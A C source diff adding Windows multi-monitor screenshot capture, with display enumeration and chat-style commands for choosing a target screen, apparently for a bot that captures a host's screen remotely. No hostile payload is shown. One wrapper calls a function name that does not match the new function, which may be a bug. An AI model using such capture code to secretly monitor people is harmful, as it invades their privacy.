@@ -23,26 +23,84 @@
 #include "../logging/logging.h"
 #include "../win32/win32_api.h"
 
+#include <ctype.h>
 #include <stdint.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-int screenshot_capture_windows(void **out_data, size_t *out_size,
-                               const char **out_mime_type,
-                               const char **out_filename) {
+#define MAX_WIN_DISPLAYS 16
+
+typedef struct {
+  int id;
+  RECT rect;
+  int is_primary;
+  char name[64];
+} win_display_info_t;
+
+static win_display_info_t win_displays[MAX_WIN_DISPLAYS];
+static int win_display_count = 0;
+static char selected_display_target[64] = "all";
+static int selected_display_index = -1;
+
+static BOOL CALLBACK MonitorEnumProc(HMONITOR hMon, HDC hdcMon, LPRECT lprcMon, LPARAM dwData) {
+  (void)hdcMon;
+  (void)dwData;
+  if (win_display_count >= MAX_WIN_DISPLAYS) return FALSE;
+
+  MONITORINFOEX mi;
+  ZeroMemory(&mi, sizeof(mi));
+  mi.cbSize = sizeof(mi);
+
+  if (GetMonitorInfo(hMon, (LPMONITORINFO)&mi)) {
+    win_displays[win_display_count].id = win_display_count;
+    win_displays[win_display_count].rect = mi.rcMonitor;
+    win_displays[win_display_count].is_primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
+    snprintf(win_displays[win_display_count].name,
+             sizeof(win_displays[win_display_count].name),
+             "Display %d (%s)", win_display_count, mi.szDevice);
+    win_display_count++;
+  }
+  return TRUE;
+}
+
+static void refresh_windows_displays(void) {
+  win_display_count = 0;
+  EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
+}
+
+int screenshot_capture_windows_display(const char *target,
+                                      void **out_data, size_t *out_size,
+                                      const char **out_mime_type,
+                                      const char **out_filename) {
   if (!out_data || !out_size || !out_mime_type || !out_filename) {
     return 0;
   }
   *out_data = NULL;
   *out_size = 0;
 
-  int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-  int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-  int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-  int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+  refresh_windows_displays();
+
+  int target_idx = -1;
+  if (target && *target && strcmp(target, "all") != 0 && strcmp(target, "*") != 0) {
+    target_idx = atoi(target);
+  }
+
+  int x, y, width, height;
+
+  if (target_idx >= 0 && target_idx < win_display_count) {
+    x = win_displays[target_idx].rect.left;
+    y = win_displays[target_idx].rect.top;
+    width = win_displays[target_idx].rect.right - win_displays[target_idx].rect.left;
+    height = win_displays[target_idx].rect.bottom - win_displays[target_idx].rect.top;
+  } else {
+    x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+  }
 
   if (width <= 0 || height <= 0) {
-    /* Fallback to primary monitor */
     width = GetSystemMetrics(SM_CXSCREEN);
     height = GetSystemMetrics(SM_CYSCREEN);
     x = 0;
@@ -136,6 +194,86 @@ int screenshot_capture_windows(void **out_data, size_t *out_size,
   *out_filename = "screenshot.bmp";
   c2t_log_info("screenshot", "Captured %dx%d Windows desktop screenshot (%zu bytes BMP)", width, height, total_size);
   return 1;
+}
+
+int screenshot_capture_windows(void **out_data, size_t *out_size,
+                               const char **out_mime_type,
+                               const char **out_filename) {
+  return screenshot_capture_display("all", out_data, out_size, out_mime_type, out_filename);
+}
+
+int screenshot_get_display_list(char *buffer, size_t max_len) {
+  if (!buffer || max_len == 0) return 0;
+  refresh_windows_displays();
+
+  if (win_display_count == 0) {
+    snprintf(buffer, max_len,
+             "🖥️ <b>Connected Displays (Windows):</b>\n\n"
+             "• <b>[all]</b> <i>Virtual Desktop / Primary Screen</i> — 🟢 <b>ACTIVE</b>\n\n"
+             "🎯 <b>Current Target:</b> <code>%s</code>\n"
+             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
+             selected_display_target);
+    return 1;
+  }
+
+  size_t offset = (size_t)snprintf(
+      buffer, max_len, "🖥️ <b>Detected Displays (%d):</b>\n\n", win_display_count);
+
+  for (int i = 0; i < win_display_count && offset + 128 < max_len; ++i) {
+    int w = win_displays[i].rect.right - win_displays[i].rect.left;
+    int h = win_displays[i].rect.bottom - win_displays[i].rect.top;
+    int active = (selected_display_index == i) || (selected_display_index == -1);
+
+    offset += (size_t)snprintf(
+        buffer + offset, max_len - offset,
+        "• <b>[%d]</b> <code>%s</code> (%dx%d)%s\n"
+        "  Status: %s\n",
+        win_displays[i].id, win_displays[i].name, w, h,
+        win_displays[i].is_primary ? " 🌟 <i>Primary</i>" : "",
+        active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>IDLE</i>");
+  }
+
+  if (offset + 128 < max_len) {
+    snprintf(buffer + offset, max_len - offset,
+             "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
+             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
+             selected_display_target);
+  }
+  return 1;
+}
+
+int screenshot_select_display(const char *target) {
+  if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
+    selected_display_index = -1;
+    snprintf(selected_display_target, sizeof(selected_display_target), "all");
+  } else {
+    int is_num = 1;
+    for (const char *p = target; *p; ++p) {
+      if (!isdigit((unsigned char)*p)) {
+        is_num = 0;
+        break;
+      }
+    }
+    if (is_num) {
+      selected_display_index = atoi(target);
+      snprintf(selected_display_target, sizeof(selected_display_target), "%d", selected_display_index);
+    } else {
+      selected_display_index = -1;
+      snprintf(selected_display_target, sizeof(selected_display_target), "%s", target);
+    }
+  }
+  c2t_log_info("screenshot", "Selected Windows display target '%s'", selected_display_target);
+  return 1;
+}
+
+void screenshot_get_selected_display(char *buffer, size_t max_len) {
+  if (!buffer || max_len == 0) return;
+  snprintf(buffer, max_len, "%s", selected_display_target);
+}
+
+int screenshot_get_display_count(void) {
+  refresh_windows_displays();
+  return win_display_count > 0 ? win_display_count : 1;
 }
 
 #endif
